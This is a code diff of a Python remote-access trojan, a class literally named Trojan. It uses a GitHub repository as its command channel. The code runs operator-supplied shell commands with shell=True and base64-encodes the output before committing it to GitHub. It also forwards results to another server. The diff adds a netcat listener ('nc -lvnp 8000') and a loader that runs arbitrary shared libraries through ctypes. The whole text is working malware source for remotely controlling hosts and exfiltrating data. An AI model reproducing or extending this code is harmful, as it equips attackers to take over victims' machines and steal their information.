@@ -9,6 +9,7 @@ import time
 import subprocess
 import requests
 from datetime import datetime
+from ctypes import CDLL, c_int
 
 def github_connect():
     with open('secret.txt') as f:
@@ -76,40 +77,47 @@ class Trojan:
                         print(f"[*] Executing command: {shell_command}")
                         result = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT)
                         result = result.decode('utf-8')
+                        self.store_command_result(shell_command, result)
                     except subprocess.CalledProcessError as e:
                         result = e.output.decode('utf-8')
-                    
-                    # Save the result to GitHub
-                    self.store_command_result(shell_command, result)
-
-                    # Send the result to the Node.js server
                     self.send_command_result(shell_command, result)
             elif command_type == 'module':
                 module_name = command.get('module')
-                if module_name:
+                if module_name == "reverse":
+                    result = subprocess.check_output('nc -lvnp 8000', shell=True, stderr=subprocess.STDOUT)
+                    result = result.decode('utf-8')
+                    self.store_command_result(module_name, result)
+                    self.send_command_result(module_name, result)
+                else:
                     if module_name not in sys.modules:
                         importlib.import_module(module_name)
                     thread = threading.Thread(target=self.module_runner, args=(module_name,))
                     thread.start()
+            elif command_type == 'c_module':
+                c_module_name = command.get('c_module')
+                if c_module_name:
+                    self.execute_c_module(c_module_name)
         else:
             print(f"Invalid command format: {command}")
 
-    def store_command_result(self, command, result):
-        timestamp = datetime.now().isoformat()
-        file_name = f"{timestamp}_shell_command.txt"
-        file_content = f"Command: {command}\n\nResult:\n{result}"
-        
-        # Encode the content to base64
-        bindata = base64.b64encode(file_content.encode('utf-8'))
-
-        # Save the file to the data folder in GitHub
-        remote_path = f'data/{self.id}/{file_name}'
-        commit_message = f"Saving output of shell command: {command}"
-        self.repo.create_file(remote_path, commit_message, bindata)
+    def execute_c_module(self, c_module_name):
+        try:
+            c_lib = CDLL(f"./{c_module_name}.so")  # Load the shared library
+            c_lib.my_function()  # Call the C function
+            result = c_lib.add(c_int(2), c_int(3))  # Call the add function
+            self.send_command_result(c_module_name, f"Result from C module: {result}")
+        except Exception as e:
+            print(f"Failed to execute C module {c_module_name}: {e}")
 
     def module_runner(self, module):
         result = sys.modules[module].run()
         self.store_module_result(result)
+
+    def store_command_result(self, command, result):
+        message = datetime.now().isoformat()
+        remote_path = f'data/{self.id}/{message}.data'
+        bindata = base64.b64encode(bytes(f"Command: {command}\nResult:\n{result}", 'utf-8'))
+        self.repo.create_file(remote_path, message, bindata)
 
     def store_module_result(self, data):
         message = datetime.now().isoformat()
